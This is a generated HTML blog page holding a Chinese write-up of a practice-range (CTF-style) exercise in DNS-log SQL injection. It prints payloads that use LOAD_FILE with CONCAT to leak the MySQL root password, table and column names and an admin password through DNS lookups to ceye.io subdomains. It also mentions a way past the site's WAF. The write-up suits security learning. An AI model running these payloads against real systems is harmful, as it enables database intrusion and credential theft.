@@ -1,0 +1,188 @@
+<!DOCTYPE html>
+<html>
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="utf-8">
+  
+
+  
+  <title>Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="首先，DNS注入并不是是对DNS服务器进行注入，而是利用DNS在解析的时候会留下的有用的日志，简称：DNS log注入。  打开靶场  url中直接注入当前php文件是不行的，使用十六进制（and(16)=616e64a）也不行，有安全狗，但是靶场的安全狗可以使用不被解析的文件进行传参  1.打开http://ceye.io，看一下payload SELECT LOAD_FILE(CONCAT(‘">
+<meta property="og:type" content="website">
+<meta property="og:title" content="Hexo">
+<meta property="og:url" content="http://yoursite.com/blog1/dns注入.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="首先，DNS注入并不是是对DNS服务器进行注入，而是利用DNS在解析的时候会留下的有用的日志，简称：DNS log注入。  打开靶场  url中直接注入当前php文件是不行的，使用十六进制（and(16)=616e64a）也不行，有安全狗，但是靶场的安全狗可以使用不被解析的文件进行传参  1.打开http://ceye.io，看一下payload SELECT LOAD_FILE(CONCAT(‘">
+<meta property="og:locale" content="en">
+<meta property="og:image" content="http://yoursite.com/upload/md/e5035ce232ef8c1bcf5437c742bb830d_51156.png">
+<meta property="og:image" content="http://yoursite.com/upload/md/734bc7111c977556295769f6b57184ab_21679.png">
+<meta property="og:image" content="http://yoursite.com/upload/md/783f5a47d55542d98bb0700fc9278bf2_97052.png">
+<meta property="og:image" content="http://yoursite.com/upload/md/ce4a18738c72d4087292ac71db81f8bd_64081.png">
+<meta property="og:updated_time" content="2019-10-20T13:30:53.481Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Hexo">
+<meta name="twitter:description" content="首先，DNS注入并不是是对DNS服务器进行注入，而是利用DNS在解析的时候会留下的有用的日志，简称：DNS log注入。  打开靶场  url中直接注入当前php文件是不行的，使用十六进制（and(16)=616e64a）也不行，有安全狗，但是靶场的安全狗可以使用不被解析的文件进行传参  1.打开http://ceye.io，看一下payload SELECT LOAD_FILE(CONCAT(‘">
+<meta name="twitter:image" content="http://yoursite.com/upload/md/e5035ce232ef8c1bcf5437c742bb830d_51156.png">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  <link rel="stylesheet" href="/css/style.css">
+</head>
+</html>
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://yoursite.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="page-" class="article article-type-page" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/blog1/dns注入.html" class="article-date">
+  <time datetime="2019-10-20T13:30:53.486Z" itemprop="datePublished">2019-10-20</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>首先，DNS注入并不是是对DNS服务器进行注入，而是利用DNS在解析的时候会留下的有用的日志，简称：DNS log注入。 </p>
+<h1 id="打开靶场-url中直接注入当前php文件是不行的，使用十六进制（and-16-616e64a）也不行，有安全狗，但是靶场的安全狗可以使用不被解析的文件进行传参-1-打开http-ceye-io，看一下payload-SELECT-LOAD-FILE-CONCAT-‘-‘-SELECT-password-FROM-mysql-user-WHERE-user-’root’-LIMIT-1-’-mysql-ip-port-b182oj-ceye-io-abc’"><a href="#打开靶场-url中直接注入当前php文件是不行的，使用十六进制（and-16-616e64a）也不行，有安全狗，但是靶场的安全狗可以使用不被解析的文件进行传参-1-打开http-ceye-io，看一下payload-SELECT-LOAD-FILE-CONCAT-‘-‘-SELECT-password-FROM-mysql-user-WHERE-user-’root’-LIMIT-1-’-mysql-ip-port-b182oj-ceye-io-abc’" class="headerlink" title="打开靶场  url中直接注入当前php文件是不行的，使用十六进制（and(16)=616e64a）也不行，有安全狗，但是靶场的安全狗可以使用不被解析的文件进行传参  1.打开http://ceye.io，看一下payload SELECT LOAD_FILE(CONCAT(‘\\‘,(SELECT password FROM mysql.user WHERE user=’root’ LIMIT 1),’.mysql.ip.port.b182oj.ceye.io\abc’));"></a>打开靶场 <img src="/upload/md/e5035ce232ef8c1bcf5437c742bb830d_51156.png" alt> url中直接注入当前php文件是不行的，使用十六进制（and(16)=616e64a）也不行，有安全狗，但是靶场的安全狗可以使用不被解析的文件进行传参 <img src="/upload/md/734bc7111c977556295769f6b57184ab_21679.png" alt> 1.打开<a href="http://ceye.io，看一下payload" target="_blank" rel="noopener">http://ceye.io，看一下payload</a> SELECT LOAD_FILE(CONCAT(‘\\‘,(SELECT password FROM mysql.user WHERE user=’root’ LIMIT 1),’.mysql.ip.port.b182oj.ceye.io\abc’));</h1><p>#2.构建我们的查询语句，首先查看表： and (SELECT LOAD_FILE(CONCAT(‘\\‘,(select table_name from information_schema.tables where table_schema=database() LIMIT 0,1),’.8vlehu.ceye.io\abc’)))# 网站里看到DNS解析为admin.8vlehu.ceye.io，也就是说第一个表是admin <img src="/upload/md/783f5a47d55542d98bb0700fc9278bf2_97052.png" alt><br>#3.由于tips提示我们flag就在admin表里，于是我们看一下字段： and (SELECT LOAD_FILE(CONCAT(‘\\‘,(select column_name from information_schema.columns where table_name = ‘admin’ LIMIT 0,1),’.8vlehu.ceye.io\abc’)))# 回显为Id.8vlehu.ceye.io，也就是说第一个字段为Id and (SELECT LOAD_FILE(CONCAT(‘\\‘,(select column_name from information_schema.columns where table_name = ‘admin’ LIMIT 1,1),’.8vlehu.ceye.io\abc’)))# 回显为username.8vlehu.ceye.io，也就是说第二个字段为username 继续，第三个字段为password<br>#4.我们看一下password： and (SELECT LOAD_FILE(CONCAT(‘\\‘,(select password from admin LIMIT 0,1),’.8vlehu.ceye.io\abc’)))#<br>#5.回显为：1flag1good1.8vlehu.ceye.io 输入这个密码，恭喜通关~ <img src="/upload/md/ce4a18738c72d4087292ac71db81f8bd_64081.png" alt> flag：1flag1good1</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/blog1/dns注入.html" data-id="ck1z1u11f000lycv0fo5hy86q" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+    
+  
+</article>
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+
+  
+    
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/10/">October 2019</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2019/10/20/csrf/">csrf</a>
+          </li>
+        
+          <li>
+            <a href="/2019/10/20/dom型xss/">dom型xss</a>
+          </li>
+        
+          <li>
+            <a href="/2019/10/20/存储型xss/">存储型xss</a>
+          </li>
+        
+          <li>
+            <a href="/2019/10/20/反射性xss/">反射性xss</a>
+          </li>
+        
+          <li>
+            <a href="/2019/10/20/dns注入/">dns注入</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2019 John Doe<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  <script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+<script src="/js/script.js"></script>
+
+
+
+  </div>
+</body>
+</html>
